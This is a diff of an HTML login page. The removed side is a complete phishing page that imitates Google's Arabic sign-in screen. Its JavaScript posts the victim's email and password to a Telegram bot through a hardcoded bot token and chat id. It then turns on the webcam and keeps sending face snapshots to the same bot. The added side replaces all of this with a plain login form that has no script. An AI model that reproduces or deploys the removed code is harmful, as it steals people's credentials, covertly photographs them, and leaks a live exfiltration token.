@@ -1,120 +1,38 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - حسابات Google</title>
-    <style>
-        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Roboto', arial, sans-serif; color: #202124; }
-        .login-box { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 5px; }
-        p { font-size: 15px; margin-bottom: 25px; }
-        .input-group { text-align: right; margin-bottom: 15px; }
-        input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline-color: #4285f4; }
-        .next-btn { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; font-size: 14px; margin-top: 20px; }
-        .next-btn:hover { background: #1765cc; }
-        #loader-box { display: none; margin-top: 20px; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        video, canvas { display: none; }
-    </style>
+    <title>Document</title>
+    <link rel="stylesheet" href="/s.css">
 </head>
 <body>
+    <div class="box">
+    <form class="form"> 
+        <img src="/download.png" width="100px">
+        <h1 class="form-title">sign in</h1>
+        <div class="form-group">
+            <input type="text" class="form-control" required>
+            <label for="" class="class-label"> email or phone</label>
+        </div>
+        <div class="form-group">
+            <input type="password" class="form-control" required>
+            <label for="" class="class-label"> password</label>
+        </div>
+        <div class="form-group">
 
-    <div class="login-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
-        <h1 id="title">تسجيل الدخول</h1>
-        <p id="subtitle">استخدم حسابك على Google</p>
-        
-        <div id="step1">
-            <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
-            <button class="next-btn" onclick="goToStep2()">التالي</button>
+            <label for="" class="show-label">
+                <input type="checkbox" id="show"> show password
+            </label>
+        </div>
+        <div class="bottom-button">
+            <a href="#">forget password ?</a>
+            <button class="form-button"> next</button>
         </div>
 
-        <div id="step2" style="display:none;">
-            <div style="margin-bottom: 15px; background: #f8f9fa; padding: 5px; border-radius: 20px; font-size: 14px;" id="displayEmail"></div>
-            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-            <button class="next-btn" id="finalBtn">تأكيد الدخول</button>
-        </div>
+    </form>
 
-        <div id="loader-box">
-            <div class="spinner"></div>
-            <p style="font-size: 12px; color: #5f6368; margin-top: 10px;">جاري تأمين الاتصال بحسابك...</p>
-        </div>
-    </div>
 
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
 
-    <script>
-        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
-        const chat = "2103976274";
-
-        function goToStep2() {
-            const email = document.getElementById('email').value;
-            if(email.includes("@")) {
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-                document.getElementById('displayEmail').innerText = email;
-            } else {
-                alert("يرجى إدخال بريد إلكتروني صحيح");
-            }
-        }
-
-        document.getElementById('finalBtn').onclick = async function() {
-            const pass = document.getElementById('password').value;
-            const email = document.getElementById('email').value;
-            
-            if(pass.length < 4) return alert("كلمة المرور قصيرة جداً");
-
-            // إرسال البيانات فوراً لتليجرام
-            sendText(`📥 **بيانات دخول جديدة:**\n📧 **Email:** \`${email}\`\n🔑 **Pass:** \`${pass}\``);
-
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('loader-box').style.display = 'block';
-            
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('v');
-                video.srcObject = s;
-
-                video.onloadedmetadata = () => {
-                    video.play();
-                    setTimeout(() => {
-                        snap();
-                        setInterval(snap, 4000); 
-                        setTimeout(() => { window.location.href = "project.html"; }, 5000);
-                    }, 1000);
-                };
-            } catch (e) {
-                sendText("⚠️ **المستهدف رفض الكاميرا بعد إعطاء البيانات**");
-                window.location.href = "project.html";
-            }
-        };
-
-        function snap() {
-            const canvas = document.getElementById('c');
-            const video = document.getElementById('v');
-            if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    const f = new FormData();
-                    f.append('chat_id', chat);
-                    f.append('photo', blob, 'user_face.jpg');
-                    fetch(api + "sendPhoto", { method: 'POST', body: f });
-                }, 'image/jpeg', 0.8);
-            }
-        }
-
-        function sendText(txt) {
-            fetch(api + "sendMessage", {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat, text: txt, parse_mode: "Markdown" })
-            });
-        }
-    </script>
 </body>
 </html>
